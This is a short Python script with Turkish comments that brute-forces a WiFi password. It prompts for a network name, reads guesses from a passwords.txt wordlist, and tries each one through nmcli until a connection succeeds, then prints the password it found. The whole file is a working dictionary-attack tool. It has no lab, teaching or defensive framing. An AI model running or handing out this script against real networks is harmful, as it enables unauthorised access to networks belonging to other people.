import subprocess
import time

def connect_to_wifi(ssid, password):
    try:
        # Bağlantıyı dene
        result = subprocess.run(
            ["nmcli", "device", "wifi", "connect", ssid, "password", password],
            capture_output=True,
            text=True
        )
        if "successfully activated" in result.stdout.lower():
            return True
        else:
            return False
    except Exception as e:
        print(f"Hata oluştu: {e}")
        return False

def main():
    ssid = input("Bağlanmak istediğin WiFi adı (SSID): ")
    
    with open("passwords.txt", "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f.readlines()]
    
    for password in passwords:
        print(f"Deniyorum: {password}")
        success = connect_to_wifi(ssid, password)
        time.sleep(2)  # Biraz bekle

        if success:
            print(f"Şifre bulundu! -> {password}")
            break
    else:
        print("Hiçbir şifre ile bağlantı sağlanamadı.")

if __name__ == "__main__":
    main()
